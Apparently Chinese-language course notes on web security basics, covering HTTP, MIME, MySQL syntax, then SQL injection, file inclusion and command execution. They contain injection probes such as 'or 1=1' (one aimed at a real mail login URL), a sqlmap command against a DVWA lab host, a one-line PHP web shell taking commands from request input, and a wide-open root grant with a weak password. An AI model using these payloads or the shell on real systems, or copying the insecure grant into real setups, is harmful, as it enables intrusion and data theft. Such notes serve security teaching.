http:超文本传输协议,TCP 80

版本:

 0.9:get功能

 1.0:引入缓存机制,引入MIME,支持长连接

 1.1:增强缓存机制,默认开启长连接

 http-ng\(2.0\)



MIME:multi internet mail extended\(mime.types\)

iamge

text/html text/css

MIME:通过某种编码方式\(base-64\)把非纯文本转换为纯文本进行传输,浏览器利用编码方式把纯文本转换为非纯文本



http method:

  GET:

  POST:

  PUT:禁用

  delete:禁用

  connect

  trace

  head

  options



http采用请求相应



请求:https://www.baidu.com,多个查询用&连接

  URL:protocol://hostname.domainname:port/resource?\[查询\]



http://www.a.com/index.html?id=1&name=zhangsan



http status code:

1xx:信息

2xx:成功

3xx:重定向

4xx:客户端错误

5xx:服务器错误



&lt;?php

echo $\_GET\['page'\];

?&gt;



https://mail.163.com/?username=lhg-005 and passwd=123456 or 1=1 & 登录=登录\#



GET:把请求放在URL中,没有请求内容

POST:把请求放在body,存在请求内容



张三:110 张三=110  key=value



序号 姓名 电话   二维表

1   张三  110



&lt;infor&gt;  XML

&lt;name&gt;张三&lt;/name&gt;

&lt;tel&gt;110&lt;/tel&gt;

&lt;/infor&gt;





web组成:

  客户端:浏览器\(同源策略 沙箱\)

  web服务器:IIS Apache Nginx

  AppServer:PHP tomcat weblogic

  DB:数据库

  Cache:缓存  redis



referer:请求资源来自哪个链接



SQL:RDBMS

MySQL Oracle MSSQL Access

NoSQL: redis等



RDBMS:

  二维表:行和列



DBMS--实例--数据库--数据表--数据



MySQL:information\_schema:从5.0版本以后



create database bbs;

use bbs;

create table info \(id int,name varchar\(10\),tel int\);

insert into info value \(1,"张三","110"\);

select \* from info where name="张三";

update info set tel="120" where name="张三";

delete from info where name="张三";



grant pri\_list \[privileges\] on db.table to 'user\_name'@'host' identified by 'passwd';



grant all on \*.\* to 'root'@'%' identified by '123456'; 

flush privileges;



MySQL:root

MSSQL:sa

Oracle:system



数据类型:

  int:整型

  浮点:单精度 双精度 定长

  char:字符型,字符必须规定长度

  date

  time

  datetime

  YEAR

  时间戳   



SQL注入:没有对输入数据进行严格过滤\(一切输入源进行过滤\)



http://www.a.com/?id=1 or 1=2

http://www.a.com/?id=1 or 1=1



system\(\)

exec\(\)



sqlmap -u http://192.168.10.142/dvwa/vulnerabilities/sqli/?id=1&submit=submit --dbs



include\(\):显示警告信息

require\(\):显示严重错误信息

include\_once\(\)

require\_once\(\)



&lt;?php $\_GET\['page'\]; ?&gt;



http://aaaaa/?page=a.txt



命令执行函数:

  system\(\) exec\(\) shell\(\)



&lt;?php 

system\("command"\); 

?&gt;

&lt;?php

system\($\_REQUEST\["code"\]\);

?&gt;



命令连接符:

 ;

 \|

 &&

